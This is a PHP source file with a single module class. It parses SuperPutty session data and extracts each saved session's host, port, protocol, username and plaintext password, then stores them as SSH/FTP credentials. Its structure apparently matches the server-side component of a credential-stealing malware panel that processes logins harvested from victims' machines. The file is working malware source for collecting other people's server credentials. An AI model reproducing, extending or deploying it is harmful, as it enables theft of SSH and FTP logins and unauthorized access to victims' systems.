<?php
class Module_superputty extends Module_
{
    protected function ProcessSuperPutty($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
            return FALSE;

        $Cnt = 0;
        $Exists = isset($XML_->SessionData[$Cnt]);
        while($Exists)
        {
            if(isset($XML_->SessionData[$Cnt]['Host']))
            {
                $Host = Assign_($XML_->SessionData[$Cnt]['Host']);
                $User = Assign_($XML_->SessionData[$Cnt]['Username']);
                $Port = Assign_($XML_->SessionData[$Cnt]['Port']);
                $Prot = Assign_($XML_->SessionData[$Cnt]['Proto']);
                $Pass = Assign_(str_replace('-pw ', '', $XML_->SessionData[$Cnt]['ExtraArgs']));

                $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == "SSH") , $Port), $User, $Pass);
            }

            $Exists = isset($XML_->SessionData[++$Cnt]);
        }

        $XML_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        if (strpos($Data, 'UTF-8') === false && strpos($Data, 'utf-8') === false)
        {
            $Data = utf8_encode($Data);
            $Data = str_replace('encoding="ISO-8859-1"', 'encoding="UTF-8"', $Data);
        }

        switch ($Version)
        {
        case 0:
            $this->ProcessSuperPutty($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
